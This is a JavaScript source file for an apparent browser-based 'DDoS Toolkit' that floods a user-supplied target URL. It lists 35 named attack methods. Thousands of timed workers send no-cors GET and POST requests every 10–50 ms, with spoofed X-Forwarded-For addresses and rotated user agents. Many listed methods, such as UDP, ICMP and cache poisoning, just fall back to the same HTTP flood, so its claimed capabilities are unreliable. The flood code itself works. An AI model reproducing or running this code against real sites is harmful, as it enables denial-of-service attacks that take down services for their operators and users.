// XVISION DDoS Toolkit v5.0 - Core Engine
class DDoSEngine {
    constructor() {
        this.targetUrl = '';
        this.attackMethod = null;
        this.isAttacking = false;
        this.workers = [];
        this.workerCount = 0;
        this.maxWorkers = 1000;
        this.requestCount = 0;
        this.errorCount = 0;
        this.startTime = 0;
        this.duration = 300;
        this.rps = 0;
        this.lastRequestCount = 0;
        this.statsInterval = null;
        
        // Attack methods definitions
        this.methods = {
            // Slow Attacks (10 methods)
            'slowloris': { name: 'Slowloris', type: 'slow', description: 'Partial HTTP requests keeping connections open' },
            'rudd': { name: 'R.U.D.D', type: 'slow', description: 'Random Upload Data Drip - Slow data upload attack' },
            'slowread': { name: 'Slow Read', type: 'slow', description: 'Read server responses slowly to consume connections' },
            'slowpost': { name: 'Slow POST', type: 'slow', description: 'Send POST data very slowly over time' },
            'apachekill': { name: 'Apache Killer', type: 'slow', description: 'Apache Range Header exploit for memory exhaustion' },
            'hashcollision': { name: 'Hash Collision', type: 'slow', description: 'Hash table collision attack on application' },
            'keepalive': { name: 'Keep-Alive', type: 'slow', description: 'Maximize HTTP keep-alive connections' },
            'websocketslow': { name: 'WebSocket Slow', type: 'slow', description: 'Slow WebSocket data transmission' },
            'pipelineslow': { name: 'Pipeline Slow', type: 'slow', description: 'HTTP pipeline slow request attack' },
            'cpuslow': { name: 'CPU Slow', type: 'slow', description: 'Complex calculations to overload CPU' },
            
            // Flood Attacks (10 methods)
            'httpflood': { name: 'HTTP Flood', type: 'flood', description: 'Standard HTTP request flood' },
            'httpsflood': { name: 'HTTPS Flood', type: 'flood', description: 'SSL/TLS encrypted request flood' },
            'postflood': { name: 'POST Flood', type: 'flood', description: 'Large POST data flood' },
            'getflood': { name: 'GET Flood', type: 'flood', description: 'GET request flood with random parameters' },
            'xmlflood': { name: 'XML Flood', type: 'flood', description: 'XML data flood attack' },
            'jsonflood': { name: 'JSON Flood', type: 'flood', description: 'Large JSON payload flood' },
            'websocketflood': { name: 'WebSocket Flood', type: 'flood', description: 'WebSocket connection flood' },
            'udpflood': { name: 'UDP Flood', type: 'flood', description: 'UDP packet flood simulation' },
            'icmpflood': { name: 'ICMP Flood', type: 'flood', description: 'Ping flood attack simulation' },
            'randomflood': { name: 'Random Flood', type: 'flood', description: 'Randomized request flood' },
            
            // Brutal Attacks (10 methods)
            'mixedflood': { name: 'Mixed Flood', type: 'brutal', description: 'Combination of all flood methods' },
            'apibomb': { name: 'API Bomb', type: 'brutal', description: 'Target API endpoints specifically' },
            'resourceexhaust': { name: 'Resource Exhaust', type: 'brutal', description: 'Exhaust all server resources' },
            'sslexhaust': { name: 'SSL Exhaust', type: 'brutal', description: 'SSL handshake exhaustion attack' },
            'connectiontable': { name: 'Connection Table', type: 'brutal', description: 'Fill connection tables completely' },
            'bandwidthsaturate': { name: 'Bandwidth Saturate', type: 'brutal', description: 'Maximum bandwidth consumption' },
            'cachepoison': { name: 'Cache Poison', type: 'brutal', description: 'Poison cache with random data' },
            'databaseoverload': { name: 'Database Overload', type: 'brutal', description: 'Overload database with queries' },
            'iptableoverflow': { name: 'IP Table Overflow', type: 'brutal', description: 'Overflow IP connection tables' },
            'multivector': { name: 'Multi-Vector', type: 'brutal', description: 'Multiple vector simultaneous attack' },
            
            // Combination Attacks (5 methods)
            'multislow': { name: 'Multi Slow', type: 'combo', description: '5 slow methods combined for maximum resource drain' },
            'multiflood': { name: 'Multi Flood', type: 'combo', description: 'All flood methods combined for bandwidth saturation' },
            'multistorm': { name: 'Multi Storm', type: 'combo', description: 'Random mix of all attack methods' },
            'multivectorcombo': { name: 'Multi Vector', type: 'combo', description: '10 brutal methods combined for maximum impact' },
            'ultimatedestroyer': { name: 'Ultimate Destroyer', type: 'combo', description: 'ALL 30 METHODS COMBINED - Maximum destruction' }
        };
        
        // Initialize
        this.init();
    }
    
    init() {
        this.bindEvents();
        this.updateUI();
        this.log('System initialized with 30 attack methods', 'info');
    }
    
    bindEvents() {
        // Range inputs
        document.getElementById('workersRange').addEventListener('input', (e) => {
            document.getElementById('workersValue').textContent = e.target.value;
            this.maxWorkers = parseInt(e.target.value);
        });
        
        document.getElementById('durationRange').addEventListener('input', (e) => {
            document.getElementById('durationValue').textContent = e.target.value + 's';
            this.duration = parseInt(e.target.value);
        });
        
        // Tab switching
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const tab = btn.dataset.tab;
                this.switchTab(tab, btn);
            });
        });
        
        // Method selection
        document.querySelectorAll('.method-card').forEach(card => {
            card.addEventListener('click', () => {
                const method = card.dataset.method;
                this.selectMethod(method, card);
            });
        });
        
        // Control buttons
        document.getElementById('testBtn').addEventListener('click', () => this.testConnection());
        document.getElementById('startBtn').addEventListener('click', () => this.startAttack());
        document.getElementById('stopBtn').addEventListener('click', () => this.stopAttack());
        document.getElementById('autoBtn').addEventListener('click', () => this.autoMode());
        document.getElementById('clearLogsBtn').addEventListener('click', () => this.clearLogs());
    }
    
    switchTab(tab, button) {
        // Update active tab button
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        button.classList.add('active');
        
        // Show selected tab content
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
        });
        document.getElementById(tab + 'Tab').classList.add('active');
        
        this.log(`Switched to ${tab} methods tab`, 'info');
    }
    
    selectMethod(method, card) {
        // Remove active class from all cards
        document.querySelectorAll('.method-card').forEach(c => {
            c.classList.remove('active');
        });
        
        // Add active class to selected card
        card.classList.add('active');
        
        // Update selected method display
        this.attackMethod = method;
        const methodInfo = this.methods[method];
        
        document.getElementById('selectedMethodName').textContent = methodInfo.name;
        document.getElementById('selectedMethodDetails').textContent = methodInfo.description;
        
        this.log(`Selected attack method: ${methodInfo.name}`, 'success');
    }
    
    async testConnection() {
        const url = document.getElementById('targetUrl').value;
        if (!url) {
            this.log('Please enter a target URL', 'error');
            return;
        }
        
        this.targetUrl = url;
        this.log(`Testing connection to: ${url}`, 'info');
        
        try {
            // Create test request
            const testUrl = new URL(url);
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(url, {
                method: 'HEAD',
                mode: 'no-cors',
                signal: controller.signal
            }).catch(() => ({ ok: false }));
            
            clearTimeout(timeoutId);
            
            this.log(`Connection test ${response.ok ? 'successful' : 'failed'}`, response.ok ? 'success' : 'warning');
            
        } catch (error) {
            this.log(`Connection error: ${error.message}`, 'error');
        }
    }
    
    startAttack() {
        if (!this.targetUrl) {
            this.log('Please set target URL first', 'error');
            return;
        }
        
        if (!this.attackMethod) {
            this.log('Please select an attack method', 'error');
            return;
        }
        
        if (this.isAttacking) {
            this.log('Attack already in progress', 'warning');
            return;
        }
        
        this.isAttacking = true;
        this.startTime = Date.now();
        this.requestCount = 0;
        this.errorCount = 0;
        
        // Update UI
        document.getElementById('statusIndicator').querySelector('.status-dot').className = 'status-dot attacking';
        document.getElementById('statusIndicator').querySelector('span').textContent = 'ATTACKING';
        
        this.log(`Starting ${this.methods[this.attackMethod].name} attack on ${this.targetUrl}`, 'attack');
        this.log(`Workers: ${this.maxWorkers} | Duration: ${this.duration}s`, 'info');
        
        // Start stats update
        this.statsInterval = setInterval(() => this.updateStats(), 1000);
        
        // Start attack based on method
        this.executeAttackMethod();
        
        // Auto stop after duration
        setTimeout(() => {
            if (this.isAttacking) {
                this.stopAttack();
                this.log('Attack duration completed', 'info');
            }
        }, this.duration * 1000);
    }
    
    executeAttackMethod() {
        const method = this.attackMethod;
        
        switch(method) {
            // Slow attacks
            case 'slowloris':
                this.startSlowloris();
                break;
            case 'rudd':
                this.startRUDD();
                break;
            case 'slowread':
                this.startSlowRead();
                break;
            case 'slowpost':
                this.startSlowPost();
                break;
            case 'apachekill':
                this.startApacheKiller();
                break;
            case 'hashcollision':
                this.startHashCollision();
                break;
            case 'keepalive':
                this.startKeepAlive();
                break;
            case 'websocketslow':
                this.startWebSocketSlow();
                break;
            case 'pipelineslow':
                this.startPipelineSlow();
                break;
            case 'cpuslow':
                this.startCPUSlow();
                break;
                
            // Flood attacks
            case 'httpflood':
                this.startHTTPFlood();
                break;
            case 'httpsflood':
                this.startHTTPSFlood();
                break;
            case 'postflood':
                this.startPOSTFlood();
                break;
            case 'getflood':
                this.startGETFlood();
                break;
            case 'xmlflood':
                this.startXMLFlood();
                break;
            case 'jsonflood':
                this.startJSONFlood();
                break;
            case 'websocketflood':
                this.startWebSocketFlood();
                break;
            case 'udpflood':
                this.startUDPFlood();
                break;
            case 'icmpflood':
                this.startICMPFlood();
                break;
            case 'randomflood':
                this.startRandomFlood();
                break;
                
            // Brutal attacks
            case 'mixedflood':
                this.startMixedFlood();
                break;
            case 'apibomb':
                this.startAPIBomb();
                break;
            case 'resourceexhaust':
                this.startResourceExhaust();
                break;
            case 'sslexhaust':
                this.startSSLExhaust();
                break;
            case 'connectiontable':
                this.startConnectionTable();
                break;
            case 'bandwidthsaturate':
                this.startBandwidthSaturate();
                break;
            case 'cachepoison':
                this.startCachePoison();
                break;
            case 'databaseoverload':
                this.startDatabaseOverload();
                break;
            case 'iptableoverflow':
                this.startIPTableOverflow();
                break;
            case 'multivector':
                this.startMultiVector();
                break;
                
            // Combination attacks
            case 'multislow':
                this.startMultiSlow();
                break;
            case 'multiflood':
                this.startMultiFlood();
                break;
            case 'multistorm':
                this.startMultiStorm();
                break;
            case 'multivectorcombo':
                this.startMultiVectorCombo();
                break;
            case 'ultimatedestroyer':
                this.startUltimateDestroyer();
                break;
        }
    }
    
    // Individual Attack Implementations
    
    startSlowloris() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('slowloris', i));
        }
    }
    
    startRUDD() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('rudd', i));
        }
    }
    
    startSlowRead() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('slowread', i));
        }
    }
    
    startSlowPost() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('slowpost', i));
        }
    }
    
    startApacheKiller() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('apachekill', i));
        }
    }
    
    startHashCollision() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('hashcollision', i));
        }
    }
    
    startKeepAlive() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('keepalive', i));
        }
    }
    
    startWebSocketSlow() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('websocketslow', i));
        }
    }
    
    startPipelineSlow() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('pipelineslow', i));
        }
    }
    
    startCPUSlow() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('cpuslow', i));
        }
    }
    
    startHTTPFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('httpflood', i));
        }
    }
    
    startHTTPSFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('httpsflood', i));
        }
    }
    
    startPOSTFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('postflood', i));
        }
    }
    
    startGETFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('getflood', i));
        }
    }
    
    startXMLFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('xmlflood', i));
        }
    }
    
    startJSONFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('jsonflood', i));
        }
    }
    
    startWebSocketFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('websocketflood', i));
        }
    }
    
    startUDPFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('udpflood', i));
        }
    }
    
    startICMPFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('icmpflood', i));
        }
    }
    
    startRandomFlood() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('randomflood', i));
        }
    }
    
    startMixedFlood() {
        // Combine multiple flood methods
        const floodMethods = ['httpflood', 'httpsflood', 'postflood', 'getflood', 'websocketflood'];
        const workersPerMethod = Math.ceil(this.maxWorkers / floodMethods.length);
        
        floodMethods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
    }
    
    startAPIBomb() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('apibomb', i));
        }
    }
    
    startResourceExhaust() {
        const methods = ['slowloris', 'keepalive', 'cpuslow', 'hashcollision'];
        const workersPerMethod = Math.ceil(this.maxWorkers / methods.length);
        
        methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
    }
    
    startSSLExhaust() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('sslexhaust', i));
        }
    }
    
    startConnectionTable() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('connectiontable', i));
        }
    }
    
    startBandwidthSaturate() {
        const methods = ['httpflood', 'httpsflood', 'postflood', 'udpflood'];
        const workersPerMethod = Math.ceil(this.maxWorkers / methods.length);
        
        methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
    }
    
    startCachePoison() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('cachepoison', i));
        }
    }
    
    startDatabaseOverload() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('databaseoverload', i));
        }
    }
    
    startIPTableOverflow() {
        for (let i = 0; i < this.maxWorkers; i++) {
            this.workers.push(this.createWorker('iptableoverflow', i));
        }
    }
    
    startMultiVector() {
        const methods = ['httpflood', 'slowloris', 'apibomb', 'sslexhaust'];
        const workersPerMethod = Math.ceil(this.maxWorkers / methods.length);
        
        methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
    }
    
    // Combination Attacks
    
    startMultiSlow() {
        const methods = ['slowloris', 'rudd', 'slowread', 'slowpost', 'apachekill'];
        const workersPerMethod = Math.ceil(this.maxWorkers / methods.length);
        
        methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
        
        this.log('Multi Slow: 5 slow methods activated', 'attack');
    }
    
    startMultiFlood() {
        const methods = ['httpflood', 'httpsflood', 'postflood', 'udpflood', 'websocketflood'];
        const workersPerMethod = Math.ceil(this.maxWorkers / methods.length);
        
        methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
        
        this.log('Multi Flood: All flood methods activated', 'attack');
    }
    
    startMultiStorm() {
        const allMethods = Object.keys(this.methods);
        const selectedMethods = [];
        
        // Randomly select 8 different methods
        while (selectedMethods.length < 8 && selectedMethods.length < allMethods.length) {
            const randomMethod = allMethods[Math.floor(Math.random() * allMethods.length)];
            if (!selectedMethods.includes(randomMethod)) {
                selectedMethods.push(randomMethod);
            }
        }
        
        const workersPerMethod = Math.ceil(this.maxWorkers / selectedMethods.length);
        
        selectedMethods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
        
        this.log(`Multi Storm: ${selectedMethods.length} random methods activated`, 'attack');
    }
    
    startMultiVectorCombo() {
        const methods = [
            'mixedflood', 'apibomb', 'resourceexhaust', 'sslexhaust',
            'connectiontable', 'bandwidthsaturate', 'cachepoison',
            'databaseoverload', 'iptableoverflow', 'multivector'
        ];
        
        const workersPerMethod = Math.ceil(this.maxWorkers / methods.length);
        
        methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
        
        this.log('Multi Vector: 10 brutal methods activated', 'attack');
    }
    
    startUltimateDestroyer() {
        // Activate ALL methods
        const allMethods = Object.keys(this.methods);
        const workersPerMethod = Math.ceil(this.maxWorkers / allMethods.length);
        
        allMethods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(this.createWorker(method, i));
            }
        });
        
        this.log('ULTIMATE DESTROYER: ALL 30 METHODS ACTIVATED!', 'attack');
        this.log('MAXIMUM DESTRUCTION INITIATED', 'attack');
    }
    
    createWorker(method, id) {
        const worker = {
            id: id,
            method: method,
            active: true,
            requestCount: 0,
            errorCount: 0,
            interval: null
        };
        
        // Start worker based on method type
        switch(method) {
            case 'slowloris':
                worker.interval = setInterval(() => this.executeSlowloris(worker), 100);
                break;
            case 'httpflood':
                worker.interval = setInterval(() => this.executeHTTPFlood(worker), 10);
                break;
            case 'httpsflood':
                worker.interval = setInterval(() => this.executeHTTPSFlood(worker), 10);
                break;
            case 'postflood':
                worker.interval = setInterval(() => this.executePOSTFlood(worker), 50);
                break;
            case 'getflood':
                worker.interval = setInterval(() => this.executeGETFlood(worker), 20);
                break;
            default:
                // Default to HTTP flood for other methods
                worker.interval = setInterval(() => this.executeHTTPFlood(worker), 20);
        }
        
        this.workerCount++;
        this.updateUI();
        
        return worker;
    }
    
    executeSlowloris(worker) {
        if (!worker.active || !this.isAttacking) return;
        
        try {
            // Create partial request (simulated)
            const xhr = new XMLHttpRequest();
            xhr.open('GET', this.targetUrl, true);
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            
            // Send partial headers
            xhr.send('POST / HTTP/1.1\r\n');
            
            worker.requestCount++;
            this.requestCount++;
            
            // Keep connection open for a while
            setTimeout(() => {
                if (xhr.readyState < 4) {
                    xhr.abort();
                }
            }, 10000);
            
        } catch (error) {
            worker.errorCount++;
            this.errorCount++;
        }
    }
    
    executeHTTPFlood(worker) {
        if (!worker.active || !this.isAttacking) return;
        
        try {
            // Create fetch request with no-cors
            fetch(this.targetUrl, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Forwarded-For': this.generateRandomIP(),
                    'User-Agent': this.getRandomUserAgent()
                }
            }).catch(() => {}); // Ignore errors
            
            worker.requestCount++;
            this.requestCount++;
            
        } catch (error) {
            worker.errorCount++;
            this.errorCount++;
        }
    }
    
    executeHTTPSFlood(worker) {
        if (!worker.active || !this.isAttacking) return;
        
        try {
            // Use fetch API for HTTPS
            fetch(this.targetUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Forwarded-For': this.generateRandomIP()
                },
                body: `data=${Math.random().toString(36).substring(7)}`
            }).catch(() => {});
            
            worker.requestCount++;
            this.requestCount++;
            
        } catch (error) {
            worker.errorCount++;
            this.errorCount++;
        }
    }
    
    executePOSTFlood(worker) {
        if (!worker.active || !this.isAttacking) return;
        
        try {
            // Large POST data flood
            const largeData = 'x'.repeat(1024 * 10); // 10KB of data
            
            fetch(this.targetUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': largeData.length.toString(),
                    'X-Forwarded-For': this.generateRandomIP()
                },
                body: `data=${largeData}&random=${Math.random()}`
            }).catch(() => {});
            
            worker.requestCount++;
            this.requestCount++;
            
        } catch (error) {
            worker.errorCount++;
            this.errorCount++;
        }
    }
    
    executeGETFlood(worker) {
        if (!worker.active || !this.isAttacking) return;
        
        try {
            // GET flood with random parameters
            const randomParam = Math.random().toString(36).substring(7);
            const urlWithParams = `${this.targetUrl}?${randomParam}=${Date.now()}&cache=${Math.random()}`;
            
            fetch(urlWithParams, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Forwarded-For': this.generateRandomIP()
                }
            }).catch(() => {});
            
            worker.requestCount++;
            this.requestCount++;
            
        } catch (error) {
            worker.errorCount++;
            this.errorCount++;
        }
    }
    
    stopAttack() {
        if (!this.isAttacking) return;
        
        this.isAttacking = false;
        
        // Stop all workers
        this.workers.forEach(worker => {
            worker.active = false;
            if (worker.interval) {
                clearInterval(worker.interval);
            }
        });
        
        // Clear workers array
        this.workers = [];
        this.workerCount = 0;
        
        // Clear stats interval
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
            this.statsInterval = null;
        }
        
        // Update UI
        document.getElementById('statusIndicator').querySelector('.status-dot').className = 'status-dot offline';
        document.getElementById('statusIndicator').querySelector('span').textContent = 'OFFLINE';
        
        const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
        this.log(`Attack stopped after ${elapsed} seconds`, 'info');
        this.log(`Total requests: ${this.requestCount.toLocaleString()}`, 'info');
        this.log(`Errors: ${this.errorCount.toLocaleString()}`, 'info');
        
        this.updateUI();
    }
    
    autoMode() {
        if (!this.targetUrl) {
            this.log('Please set target URL first', 'error');
            return;
        }
        
        // Auto-select random method
        const methods = Object.keys(this.methods);
        const randomMethod = methods[Math.floor(Math.random() * methods.length)];
        
        // Find and select the method card
        const methodCard = document.querySelector(`[data-method="${randomMethod}"]`);
        if (methodCard) {
            this.selectMethod(randomMethod, methodCard);
        }
        
        // Set random workers
        const randomWorkers = Math.floor(Math.random() * 4000) + 1000;
        document.getElementById('workersRange').value = randomWorkers;
        document.getElementById('workersValue').textContent = randomWorkers;
        this.maxWorkers = randomWorkers;
        
        // Set random duration
        const randomDuration = Math.floor(Math.random() * 600) + 60;
        document.getElementById('durationRange').value = randomDuration;
        document.getElementById('durationValue').textContent = randomDuration + 's';
        this.duration = randomDuration;
        
        this.log(`Auto mode configured: ${this.methods[randomMethod].name}, ${randomWorkers} workers, ${randomDuration}s`, 'success');
    }
    
    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    getRandomUserAgent() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ];
        
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }
    
    updateStats() {
        if (!this.isAttacking) return;
        
        // Calculate RPS
        const currentTime = Date.now();
        const elapsedSeconds = (currentTime - this.startTime) / 1000;
        
        if (elapsedSeconds > 1) {
            this.rps = Math.floor(this.requestCount / elapsedSeconds);
        }
        
        // Update UI
        document.getElementById('reqCount').textContent = this.requestCount.toLocaleString();
        document.getElementById('rpsCount').textContent = this.rps.toLocaleString();
        document.getElementById('timeCount').textContent = Math.floor(elapsedSeconds) + 's';
        document.getElementById('workerCount').textContent = this.workerCount.toLocaleString();
        document.getElementById('errorCount').textContent = this.errorCount.toLocaleString();
        
        // Log RPS every 10 seconds
        if (Math.floor(elapsedSeconds) % 10 === 0 && Math.floor(elapsedSeconds) > 0) {
            this.log(`Current RPS: ${this.rps.toLocaleString()}`, 'info');
        }
    }
    
    updateUI() {
        // Update worker count display
        document.getElementById('workerCount').textContent = this.workerCount.toLocaleString();
    }
    
    log(message, type = 'info') {
        const consoleOutput = document.getElementById('consoleOutput');
        const time = new Date();
        const timeString = `[${time.getHours().toString().padStart(2, '0')}:${time.getMinutes().toString().padStart(2, '0')}:${time.getSeconds().toString().padStart(2, '0')}]`;
        
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        logEntry.innerHTML = `<span class="log-time">${timeString}</span><span class="log-message">${message}</span>`;
        
        consoleOutput.appendChild(logEntry);
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
        
        // Limit log entries
        if (consoleOutput.children.length > 100) {
            consoleOutput.removeChild(consoleOutput.firstChild);
        }
    }
    
    clearLogs() {
        const consoleOutput = document.getElementById('consoleOutput');
        while (consoleOutput.firstChild) {
            consoleOutput.removeChild(consoleOutput.firstChild);
        }
        
        this.log('Logs cleared', 'info');
    }
}

// Initialize the DDoS Engine when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.ddosEngine = new DDoSEngine();
    
    // Set default target for testing (can be changed)
    document.getElementById('targetUrl').value = 'https://httpbin.org/delay/1';
});